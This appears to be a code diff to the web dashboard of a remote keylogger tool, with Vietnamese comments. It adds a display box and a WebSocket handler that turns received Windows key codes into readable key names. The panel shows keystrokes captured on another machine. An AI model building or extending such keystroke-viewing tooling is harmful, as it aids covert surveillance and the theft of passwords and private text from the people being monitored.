@@ -136,6 +136,10 @@
                     Dừng Keylogger
                 </button>
             </div>
+            <div id="keylog-box"
+                class="h-40 overflow-y-auto bg-black/40 p-2 border border-gray-700 rounded text-green-400 text-sm font-mono mb-3">
+                <div class="opacity-50">Chưa có phím nào...</div>
+            </div>
         </div>
     </div>
 
@@ -189,6 +193,23 @@
             p.textContent = `[${t}] ${msg}`;
             ui.log.appendChild(p);
             ui.log.scrollTop = ui.log.scrollHeight;
+        }
+
+        function keylog(text) {
+            const box = document.getElementById("keylog-box");
+            if (!box) return;
+
+            // Xóa dòng "Chưa có phím nào..." nếu còn
+            if (box.children.length === 1 && box.children[0].classList.contains("opacity-50")) {
+                box.innerHTML = "";
+            }
+
+            const line = document.createElement("div");
+            line.textContent = text;
+            box.appendChild(line);
+
+            // Scroll xuống cuối
+            box.scrollTop = box.scrollHeight;
         }
 
         function connectWS() {
@@ -258,6 +279,82 @@
 
                 case "error":
                     log("Server lỗi: " + msg.message, "error");
+                    break;
+                case "key_event":
+                    let code = msg.key_code;
+                    let keyView = "";
+
+                    // ===== CHỮ A–Z =====
+                    if (code >= 65 && code <= 90) {
+                        keyView = String.fromCharCode(code);
+                    }
+                    // ===== SỐ 0–9 (hàng phím chính) =====
+                    else if (code >= 48 && code <= 57) {
+                        keyView = String.fromCharCode(code);
+                    }
+                    // ===== NUMPAD 0–9 =====
+                    else if (code >= 96 && code <= 105) {
+                        keyView = (code - 96).toString();
+                    }
+                    // ===== SPACE =====
+                    else if (code === 32) {
+                        keyView = "SPACE (␣)";
+                    }
+                    // ===== ENTER =====
+                    else if (code === 13) {
+                        keyView = "ENTER";
+                    }
+                    // ===== TAB =====
+                    else if (code === 9) {
+                        keyView = "TAB";
+                    }
+
+                    // ===== PHÍM ĐẶC BIỆT / MODIFIER =====
+                    else if (code === 16 || code === 160 || code === 161) {
+                        keyView = "SHIFT";
+                    }
+                    else if (code === 17 || code === 162 || code === 163) {
+                        keyView = "CTRL";
+                    }
+                    else if (code === 18 || code === 164 || code === 165) {
+                        keyView = "ALT";
+                    }
+                    else if (code === 27) {
+                        keyView = "ESC";
+                    }
+                    else if (code === 20) {
+                        keyView = "CAPS LOCK";
+                    }
+
+                    // ===== ARROWS =====
+                    else if (code === 37) keyView = "LEFT";
+                    else if (code === 38) keyView = "UP";
+                    else if (code === 39) keyView = "RIGHT";
+                    else if (code === 40) keyView = "DOWN";
+
+                    // ===== INSERT / DELETE / HOME / END / PAGEUP / PAGEDOWN =====
+                    else if (code === 45) keyView = "INSERT";
+                    else if (code === 46) keyView = "DELETE";
+                    else if (code === 36) keyView = "HOME";
+                    else if (code === 35) keyView = "END";
+                    else if (code === 33) keyView = "PAGE UP";
+                    else if (code === 34) keyView = "PAGE DOWN";
+
+                    // ===== PRINT SCREEN / PAUSE =====
+                    else if (code === 44) keyView = "PRINT SCREEN";
+                    else if (code === 19) keyView = "PAUSE";
+
+                    // ===== F1 – F12 =====
+                    else if (code >= 112 && code <= 123) {
+                        keyView = "F" + (code - 111); // F1=112 → 1
+                    }
+
+                    // ===== PHÍM CÒN LẠI =====
+                    else {
+                        keyView = "[VK " + code + "]";
+                    }
+
+                    keylog(keyView);
                     break;
             }
         }
